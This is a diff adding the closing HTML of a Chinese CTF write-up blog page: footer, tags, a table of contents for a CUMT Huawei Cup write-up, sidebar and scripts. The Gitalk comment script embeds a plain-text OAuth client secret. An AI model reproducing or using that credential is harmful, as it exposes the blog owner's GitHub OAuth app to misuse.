+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%A2%98%E8%A7%A3/" rel="tag"># 题解</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/" rel="prev" title="反弹shell总结">
+      <i class="fa fa-chevron-left"></i> 反弹shell总结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2099/09/27/BUU%E5%88%B7%E9%A2%98/" rel="next" title="BUU刷题">
+      BUU刷题 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CUMT华为杯"><span class="nav-number">1.</span> <span class="nav-text">CUMT华为杯</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyflask"><span class="nav-number">2.1.</span> <span class="nav-text">babyflask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#doge"><span class="nav-number">2.2.</span> <span class="nav-text">doge</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#re"><span class="nav-number">3.</span> <span class="nav-text">re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-world"><span class="nav-number">3.1.</span> <span class="nav-text">hello_world</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#non-name"><span class="nav-number">3.2.</span> <span class="nav-text">non_name</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">4.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Classical"><span class="nav-number">4.1.</span> <span class="nav-text">Classical</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezRSA"><span class="nav-number">4.2.</span> <span class="nav-text">ezRSA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">5.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Sign-In"><span class="nav-number">5.1.</span> <span class="nav-text">Sign In</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#出个流量分析吧"><span class="nav-number">5.2.</span> <span class="nav-text">出个流量分析吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#出个LSB吧"><span class="nav-number">5.3.</span> <span class="nav-text">出个LSB吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#出个伪web吧"><span class="nav-number">5.4.</span> <span class="nav-text">出个伪web吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#出个文档吧"><span class="nav-number">5.5.</span> <span class="nav-text">出个文档吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内存取证"><span class="nav-number">5.6.</span> <span class="nav-text">内存取证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#出个压缩包吧"><span class="nav-number">5.7.</span> <span class="nav-text">出个压缩包吧</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Pz1o"
+      src="/images/timg.jpeg">
+  <p class="site-author-name" itemprop="name">Pz1o</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pz1o</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">96k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:27</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '39c3461c126ff179de81',
+      clientSecret: '07cc5b1c7e860dc2430617d4e53c6d8610d1e09f',
+      repo        : 'comments',
+      owner       : 'pz1o',
+      admin       : ['pz1o'],
+      id          : '900e16dd3427488ab27b8f9e2bd4e25a',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
